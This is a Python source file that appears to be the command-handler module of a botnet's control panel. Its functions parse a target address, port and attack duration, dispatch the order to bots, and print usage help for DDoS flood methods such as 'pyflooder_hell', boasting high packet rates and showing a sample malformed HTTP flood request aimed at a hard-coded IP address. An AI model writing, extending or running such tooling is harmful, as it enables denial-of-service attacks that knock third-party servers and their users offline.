from colorama import Fore
import random

def pyflooder(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder [IP/URL] [PORT] [TIME] [MODE_HEADER_SOCKET]')
        send(client, 'Example attack by url')
        send(client, '.pyflooder https://www.example.com 80 10')
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")
        send(client, "# NOTE you can use command M_HEAD for show mode_header_socket")

def PYFLOODERHELLSOCKET(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[4]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .phs [IP/URL] [PORT] [MODE_HEADER_SOCKET] [TIME]')
        send(client, 'Example attack by url')
        send(client, '.pyflooder https://www.example.com 80 10')
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")
        send(client, "# NOTE you can use command M_HEAD for show mode_header_socket")

def pyflooder_l4_l7(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder_6k [IP/URL] [PORT] [TIME]')
        send(client, 'THIS METHODS CAN MAKE PPS/RPS HIGH (6K) BUT SIZE 40 MB FOR SOME SERVER')
        send(client, 'CAN ATTACK L7 6K OR L4 FOR SOME SERVER HIT 10k')
    

def pyflooder_hell(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder_hell [IP/URL] [PORT] [TIME]')
        send(client, 'THIS METHODS USE ERROR HTTP GET PACKET TO SEND PACKET MOST HIGH')
        send(client, 'PPS/RPS MAX 100K FOR SOME PACKET')
        send(client, f'Example message --> {random.choice(("AGE","CLOUDFLARE","DATE","SERVER","METHOD","HTTPHIT","DATA","PUSSY","CACHE","REFERER","BLOCK","VPN","URL","PROXY","READING","WAIT","OS","SETTING","MIRAI","RANSOMWARE","TCP","NTP","REMOVE","PACKET","INFECTION","HELL","GOLD","FTP","IMAP","RAP","MOM","GATEWAY"))} /1234 HTTP/1.1\\nHost: 45.55.133.56\\n\\n')

def pyflooder_hell2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder_hell2 [IP/URL] [PORT] [TIME]')
        send(client, 'THIS METHODS USE ERROR HTTP GET PACKET TO SEND PACKET MOST HIGH')
        send(client, 'PPS/RPS MAX 100K FOR SOME PACKET BUT RANDOM PACKET')
        send(client, f'Example message --> {random.choice(("AGE","CLOUDFLARE","DATE","SERVER","METHOD","HTTPHIT","DATA","PUSSY","CACHE","REFERER","BLOCK","VPN","URL","PROXY","READING","WAIT","OS","SETTING","MIRAI","RANSOMWARE","TCP","NTP","REMOVE","PACKET","INFECTION","HELL","GOLD","FTP","IMAP","RAP","MOM","GATEWAY"))} /1234 HTTP/1.1\\nHost: 45.55.133.56\\n\\n')

def pyflooder2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder2 [IP/URL] [PORT] [TIME] [MODE_HEADER_SOCKET]')
        send(client, 'Example attack by url')
        send(client, '.pyflooder https://www.example.com 80 10')
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")
        send(client, "# NOTE you can use command M_HEAD for show mode_header_socket")

def pyflooder3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, 'Usage: .pyflooder3 [IP/URL] [PORT] [TIME] [MODE_HEADER_SOCKET]')
        send(client, 'Example attack by url')
        send(client, '.pyflooder https://www.example.com 80 10')
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")
        send(client, "# NOTE you can use command M_HEAD for show mode_header_socket")